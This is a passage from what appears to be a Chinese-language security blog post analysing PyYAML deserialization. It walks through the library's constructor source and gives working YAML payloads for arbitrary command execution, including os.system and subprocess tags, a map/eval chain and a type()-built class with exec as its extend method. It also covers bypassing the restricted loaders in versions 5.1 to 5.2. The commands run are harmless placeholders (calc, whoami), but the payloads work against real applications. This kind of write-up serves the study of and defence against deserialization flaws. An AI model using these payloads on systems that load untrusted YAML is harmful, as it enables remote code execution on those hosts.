+<span class="token keyword">print</span> <span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'simple.yml'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>
+    fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先，使用<strong>yaml_test.py</strong>来创建一个poc对象，</p>
+<p>之后再调用<code>yaml.dump()</code>将其序列化为一个字符串，其中第10行代码主要用于将默认的”<strong>main</strong>“替换为该文件名”yaml_test”，</p>
+<p>这样做的目的是为了后面<code>yaml.load()</code>反序列化该字符串的时候会根据yaml文件中的指引去读取 <strong>yaml_test.py</strong> 中的poc这个类，否则无法正确执行，</p>
+<p>运行该 <strong>yaml_test.py</strong> 来生成 <strong>simple.yml</strong> 文件（每次运行时会调用 __init__ 所以会弹一次计算器）</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230617172655499.png" alt="image-20230617172655499"></p>
+<h2 id="py-x2F-object"><a href="#py-x2F-object" class="headerlink" title="!!py&#x2F;object"></a>!!py&#x2F;object</h2><p>simple.yml 内容如下</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!python/object:yaml_test.poc</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>之后构建<strong>yaml_verify.py</strong>，并通过<code>yaml.load()</code>读取目标yaml文件</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'simple.yml'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>
+    yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>之后<code>!!python/object</code>标签解析其中的名为 yaml_test 的 module 中的poc类，最后执行了该类对象的 __init__ 方法从而执行命令</p>
+<p>弹出计算器</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230617173439483.png" alt="image-20230617173439483"></p>
+<p>同样的，我们可以直接输入 yaml 字符串进行反序列化：<code>yaml.load(&quot;!!python/object:yaml_test.poc &#123;&#125;&quot;)</code></p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>在 load 处下断点进行跟踪，调用链：<code>load -&gt; get_single_data -&gt; construct_document -&gt; construct_object</code></p>
+<p>来到 site-packages&#x2F;yaml&#x2F;constructor.py，发现其标签解析的处理函数<code>construct_python_object</code></p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250114174156409.png" alt="image-20250114174156409"></p>
+<p>从注释可以看出标签与对应的处理函数：</p>
+<ul>
+<li><code>!!python/object</code> &#x3D;&gt; <code>Constructor.construct_python_object</code></li>
+<li><code>!!python/object/apply</code> &#x3D;&gt; <code>Constructor.construct_python_object_apply</code></li>
+<li><code>!!python/object/new</code> &#x3D;&gt; <code>Constructor.construct_python_object_new</code></li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">construct_python_object</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> suffix<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># Format:</span>
+    <span class="token comment">#   !!python/object:module.name &#123; ... state ... &#125;</span>
+    instance <span class="token operator">=</span> self<span class="token punctuation">.</span>make_python_instance<span class="token punctuation">(</span>suffix<span class="token punctuation">,</span> node<span class="token punctuation">,</span> newobj<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    <span class="token keyword">yield</span> instance
+    deep <span class="token operator">=</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>instance<span class="token punctuation">,</span> <span class="token string">'__setstate__'</span><span class="token punctuation">)</span>
+    state <span class="token operator">=</span> self<span class="token punctuation">.</span>construct_mapping<span class="token punctuation">(</span>node<span class="token punctuation">,</span> deep<span class="token operator">=</span>deep<span class="token punctuation">)</span>
+    self<span class="token punctuation">.</span>set_python_instance_state<span class="token punctuation">(</span>instance<span class="token punctuation">,</span> state<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">construct_python_object_apply</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> suffix<span class="token punctuation">,</span> node<span class="token punctuation">,</span> newobj<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># Format:</span>
+    <span class="token comment">#   !!python/object/apply       # (or !!python/object/new)</span>
+    <span class="token comment">#   args: [ ... arguments ... ]</span>
+    <span class="token comment">#   kwds: &#123; ... keywords ... &#125;</span>
+    <span class="token comment">#   state: ... state ...</span>
+    <span class="token comment">#   listitems: [ ... listitems ... ]</span>
+    <span class="token comment">#   dictitems: &#123; ... dictitems ... &#125;</span>
+    <span class="token comment"># or short format:</span>
+    <span class="token comment">#   !!python/object/apply [ ... arguments ... ]</span>
+    <span class="token comment"># The difference between !!python/object/apply and !!python/object/new</span>
+    <span class="token comment"># is how an object is created, check make_python_instance for details.</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> SequenceNode<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        args <span class="token operator">=</span> self<span class="token punctuation">.</span>construct_sequence<span class="token punctuation">(</span>node<span class="token punctuation">,</span> deep<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+        kwds <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+        state <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+        listitems <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        dictitems <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        value <span class="token operator">=</span> self<span class="token punctuation">.</span>construct_mapping<span class="token punctuation">(</span>node<span class="token punctuation">,</span> deep<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+        args <span class="token operator">=</span> value<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'args'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        kwds <span class="token operator">=</span> value<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'kwds'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        state <span class="token operator">=</span> value<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'state'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        listitems <span class="token operator">=</span> value<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'listitems'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        dictitems <span class="token operator">=</span> value<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'dictitems'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    instance <span class="token operator">=</span> self<span class="token punctuation">.</span>make_python_instance<span class="token punctuation">(</span>suffix<span class="token punctuation">,</span> node<span class="token punctuation">,</span> args<span class="token punctuation">,</span> kwds<span class="token punctuation">,</span> newobj<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> state<span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>set_python_instance_state<span class="token punctuation">(</span>instance<span class="token punctuation">,</span> state<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> listitems<span class="token punctuation">:</span>
+        instance<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>listitems<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> dictitems<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> key <span class="token keyword">in</span> dictitems<span class="token punctuation">:</span>
+            instance<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> dictitems<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+    <span class="token keyword">return</span> instance
+
+<span class="token keyword">def</span> <span class="token function">construct_python_object_new</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> suffix<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> self<span class="token punctuation">.</span>construct_python_object_apply<span class="token punctuation">(</span>suffix<span class="token punctuation">,</span> node<span class="token punctuation">,</span> newobj<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>!!python/object/new</code> 这个标签的代码实现其实和 <code>!!python/object/apply</code> 一样，只是 newobj 参数值不同而已</p>
+<p>可以看到这三个函数最终都调用了<code>make_python_instance</code></p>
+<p>跟进</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250114174943816.png" alt="image-20250114174943816"></p>
+<p>在经过其中的 find_python_name 时弹出计算器</p>
+<p>跟进 find_python_name </p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250114175216521.png" alt="image-20250114175216521"></p>
+<p>这里会进行一次 __import__，在 import 时会自动调用 __init__，于是弹出了计算器</p>
+<hr>
+<h2 id="py-x2F-module"><a href="#py-x2F-module" class="headerlink" title="!!py&#x2F;module"></a>!!py&#x2F;module</h2><p>直接写一个恶意文件</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>然后触发反序列化</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml
+poc <span class="token operator">=</span> <span class="token string">"!!python/module:evil"</span>
+yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121003359761.png" alt="image-20250121003359761"></p>
+<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>下断点跟进，前面的调用链一样，而这个标签构造器选择的是<code>construct_python_module</code></p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121003842429.png" alt="image-20250121003842429"></p>
+<p>跟进 find_python_module</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121004035320.png" alt="image-20250121004035320"></p>
+<p>看到 import 了，直接导入文件运行</p>
+<hr>
+<h2 id="python-x2F-name"><a href="#python-x2F-name" class="headerlink" title="!!python&#x2F;name"></a>!!python&#x2F;name</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml
+
+test <span class="token operator">=</span> <span class="token string">"just_test"</span>
+poc <span class="token operator">=</span> <span class="token string">"!!python/name:__main__.test"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121004244436.png" alt="image-20250121004244436"></p>
+<p>可以获取对象的值</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121005337849.png" alt="image-20250121005337849"></p>
+<h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><p>同样下断点</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121004517542.png" alt="image-20250121004517542"></p>
+<p>这次来到了 construct_python_name</p>
+<p>跟踪 find_python_name</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121004607368.png" alt="image-20250121004607368"></p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121005012185.png" alt="image-20250121005012185"></p>
+<p>可以看到最终会使用 <code>getattr</code> 获取对象的值</p>
+<hr>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!python/object/apply:os.system</span> <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span>
+<span class="token tag">!!python/object/new:os.system</span> <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span>    
+<span class="token tag">!!python/object/new:subprocess.check_output</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+<span class="token tag">!!python/object/apply:subprocess.check_output</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>find_python_name 会返回模块对象，结合传入的参数就可以执行任意命令了</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250114175717040.png" alt="image-20250114175717040"></p>
+<hr>
+<h1 id="PyYAML-gt-x3D-5-1"><a href="#PyYAML-gt-x3D-5-1" class="headerlink" title="PyYAML &gt;&#x3D; 5.1"></a>PyYAML &gt;&#x3D; 5.1</h1><p>在 PyYAML &gt;&#x3D; 5.1 时，开发者就将构造器分为：</p>
+<ol>
+<li><code>BaseConstructor</code>：没有任何强制类型转换</li>
+<li><code>SafeConstructor</code>：只有基础类型的强制类型转换</li>
+<li><code>FullConstructor</code>：除了 <code>python/object/apply</code> 之外都支持，但是加载的模块必须位于 <code>sys.modules</code> 中（说明已经主动 import 过了才让加载）。这个是<strong>默认的构造器</strong>。</li>
+<li><code>UnsafeConstructor</code>：支持全部的强制类型转换</li>
+<li><code>Constructor</code>：等同于 <code>UnsafeConstructor</code></li>
+</ol>
+<p>那么<code>load</code>时需要主动指定加载器了，否则就会报错 the default Loader is unsafe</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121010823015.png" alt="image-20250121010823015"></p>
+<p>跟进发现问题出在这里：</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121012450551.png" alt="image-20250121012450551"></p>
+<p>要经过 unsafe 的判断才能进 import，但是 unsafe 默认是 False 的</p>
+<p>还看到这里引入的类必须是 sys.modules 里有的</p>
+<p>而且在底下 getattr 返回之后，出来下面还有一层判断</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121012851699.png" alt="image-20250121012851699"></p>
+<p>一个是 unsafe，另一个是检测对象是否是一个类（例如 <code>int</code>、<code>str</code> 之类的），明显 os.system 是方法不是类</p>
+<p>于是就报错：while constructing a Python instance expected a class, but found &lt;class ‘builtin_function_or_method’&gt;</p>
+<h2 id="5-1-≤-version-lt-5-2"><a href="#5-1-≤-version-lt-5-2" class="headerlink" title="5.1 ≤ version &lt; 5.2"></a>5.1 ≤ version &lt; 5.2</h2><h3 id="指定构造器"><a href="#指定构造器" class="headerlink" title="指定构造器"></a>指定构造器</h3><p>直接指定构造器（实际上绝大多数场景都不会指定的），就像下面这样</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml
+<span class="token keyword">from</span> yaml <span class="token keyword">import</span> <span class="token operator">*</span>
+
+yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'!!python/object/apply:os.system ["calc.exe"]'</span><span class="token punctuation">,</span>Loader<span class="token operator">=</span>Loader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这样的构造器还有：</p>
+<ol>
+<li><code>yaml.unsafe_load(exp)</code></li>
+<li><code>yaml.unsafe_load_all(exp)</code></li>
+<li><code>yaml.load(exp, Loader=UnsafeLoader)</code></li>
+<li><code>yaml.load(exp, Loader=Loader)</code></li>
+<li><code>yaml.load_all(exp, Loader=UnsafeLoader)</code></li>
+<li><code>yaml.load_all(exp, Loader=Loader)</code></li>
+</ol>
+<hr>
+<h3 id="在-FullConstructor-下引入类"><a href="#在-FullConstructor-下引入类" class="headerlink" title="在 FullConstructor 下引入类"></a>在 FullConstructor 下引入类</h3><p>如果一个类满足在 FullConstructor 上下文中的 <code>sys.modules</code> 里，同时它还有一个类，那么这个类可以执行命令</p>
+<p>而<code>subprocess.Popen</code>就满足这个要求</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121013514137.png" alt="image-20250121013514137"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> yaml <span class="token keyword">import</span> <span class="token operator">*</span>
+data <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""!!python/object/apply:subprocess.Popen
+- calc"""</span>
+deserialized_data <span class="token operator">=</span> load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>deserialized_data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里很奇怪的一点是：当我们采用调试的方式启动这个脚本时，成功执行；但是直接使用<code>python</code>命令启动时，会报错：module ‘subprocess’ is not imported</p>
+<p>猜测应该是调试器启动时会引入 subprocess 模块导致命令执行</p>
+<p>在 find_python_name 里面写个打印，看一下引入了什么</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121014456962.png" alt="image-20250121014456962"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">sys
+builtins
+_frozen_importlib
+_imp
+_thread
+_warnings
+_weakref
+_io
+marshal
+nt
+winreg
+_frozen_importlib_external
+time
+zipimport
+_codecs
+codecs
+encodings<span class="token punctuation">.</span>aliases
+encodings
+encodings<span class="token punctuation">.</span>utf_8
+_codecs_cn
+_multibytecodec
+encodings<span class="token punctuation">.</span>gbk
+_signal
+_abc
+abc
+io
+__main__
+_stat
+stat
+_collections_abc
+genericpath
+_winapi
+ntpath
+os<span class="token punctuation">.</span>path
+os
+_sitebuiltins
+types
+importlib<span class="token punctuation">.</span>_bootstrap
+importlib<span class="token punctuation">.</span>_bootstrap_external
+warnings
+importlib
+importlib<span class="token punctuation">.</span>_abc
+itertools
+keyword
+_operator
+operator
+reprlib
+_collections
+collections
+_functools
+functools
+contextlib
+importlib<span class="token punctuation">.</span>util
+importlib<span class="token punctuation">.</span>machinery
+paste
+_distutils_hack
+mpl_toolkits
+pywin32_system32
+pywin32_bootstrap
+zope
+site
+yaml<span class="token punctuation">.</span>error
+yaml<span class="token punctuation">.</span>tokens
+yaml<span class="token punctuation">.</span>events
+yaml<span class="token punctuation">.</span>nodes
+enum
+_sre
+sre_constants
+sre_parse
+sre_compile
+_locale
+copyreg
+re
+yaml<span class="token punctuation">.</span>reader
+yaml<span class="token punctuation">.</span>scanner
+yaml<span class="token punctuation">.</span>parser
+yaml<span class="token punctuation">.</span>composer
+collections<span class="token punctuation">.</span>abc
+math
+_datetime
+datetime
+_struct
+struct
+binascii
+base64
+yaml<span class="token punctuation">.</span>constructor
+yaml<span class="token punctuation">.</span>resolver
+yaml<span class="token punctuation">.</span>loader
+yaml<span class="token punctuation">.</span>emitter
+yaml<span class="token punctuation">.</span>serializer
+yaml<span class="token punctuation">.</span>representer
+yaml<span class="token punctuation">.</span>dumper
+yaml
+token
+tokenize
+linecache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>分直接执行与调试的情况分别打印</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121014802652.png" alt="image-20250121014802652"></p>
+<p>可以看到调试器确有引入</p>
+<p>那么只有在文件内主动 <code>import subprocess</code> 才能实现命令执行</p>
+<hr>
+<h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>除了 !!python&#x2F;object&#x2F;apply ，我们可以遍历一下看看 builtins 下的所有方法，找到一些看起来可能有用的：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">bool</span>、<span class="token builtin">bytearray</span>、<span class="token builtin">bytes</span>
+<span class="token builtin">complex</span>
+<span class="token builtin">dict</span>
+<span class="token builtin">enumerate</span>
+<span class="token builtin">filter</span>、<span class="token builtin">float</span>、<span class="token builtin">frozenset</span>
+<span class="token builtin">int</span>
+<span class="token builtin">list</span>
+<span class="token builtin">map</span>、<span class="token builtin">memoryview</span>
+<span class="token builtin">object</span>
+<span class="token builtin">range</span>、<span class="token builtin">reversed</span>
+<span class="token builtin">set</span>、<span class="token builtin">slice</span>、<span class="token builtin">str</span>、<span class="token builtin">staticmethod</span>
+<span class="token builtin">tuple</span>
+<span class="token builtin">zip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>map：<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.13/library/functions.html#map">https://docs.python.org/zh-cn/3.13/library/functions.html#map</a></p>
+<blockquote>
+<p>返回一个将 <em>function</em> 应用于 <em>iterable</em> 的每一项，并产生其结果的迭代器</p>
+</blockquote>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义一个函数，用于计算平方</span>
+<span class="token keyword">def</span> <span class="token function">square</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> x <span class="token operator">**</span> <span class="token number">2</span>
+
+<span class="token comment"># 创建一个列表</span>
+numbers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>
+
+<span class="token comment"># 使用 map() 函数将函数应用于列表中的每个元素</span>
+squared_numbers <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span>square<span class="token punctuation">,</span> numbers<span class="token punctuation">)</span>
+
+<span class="token comment"># 转换为列表以查看结果</span>
+result <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>squared_numbers<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>  <span class="token comment"># 输出 [1, 4, 9, 16, 25]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在 python3 中 map 返回的是个<strong>迭代器</strong>，那么可以配合其他函数进行 rce ，比如</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment"># 其中返回的数据类型tuple可以换成list、set、bytes、frozenset都行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>那么poc：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml
+
+poc <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
+!!python/object/new:tuple
+- !!python/object/new:map
+  - !!python/name:eval
+  - ["__import__('os').system('whoami')"]
+'''</span>
+yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121015933775.png" alt="image-20250121015933775"></p>
+<p>PS：上面提到的其他返回类型中，按理说 list 和 set 也能实现同样的效果，但是这里用 !!python&#x2F;object&#x2F;new 标签是却会忽略参数，返回空</p>
+<hr>
+<h3 id="listitems-触发-extend"><a href="#listitems-触发-extend" class="headerlink" title="listitems 触发 extend"></a>listitems 触发 extend</h3><p>从上面的分析可以看出来，我们不需要直接命令执行，只需要满足 触发带参调用 + 引入函数 就能rce</p>
+<p>在<code>construct_python_object_apply</code>中看到</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121114930896.png" alt="image-20250121114930896"></p>
+<p>对于 listitems，这里作为参数可以调用前面返回的类里的 extend 方法</p>
+<p>那么我们就需要自行构造一个类，实例化后有 extend 方法可以调用</p>
+<p>使用 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.13/library/functions.html#type">type()</a> 构造一个 test 类，其中具有 extend 方法，调用 exec</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"extend"</span><span class="token punctuation">:</span><span class="token keyword">exec</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>于是可以构造出poc：</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!python/object/new:type</span>
+<span class="token key atrule">args</span><span class="token punctuation">:</span>
+  <span class="token punctuation">-</span> test
+  <span class="token punctuation">-</span> <span class="token tag">!!python/tuple</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+  <span class="token punctuation">-</span> <span class="token punctuation">&#123;</span><span class="token key atrule">"extend"</span><span class="token punctuation">:</span> <span class="token tag">!!python/name:exec</span> <span class="token punctuation">&#125;</span>
+<span class="token key atrule">listitems</span><span class="token punctuation">:</span> <span class="token string">"__import__('os').system('whoami')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250121172052983.png" alt="image-20250121172052983"></p>
+<hr>
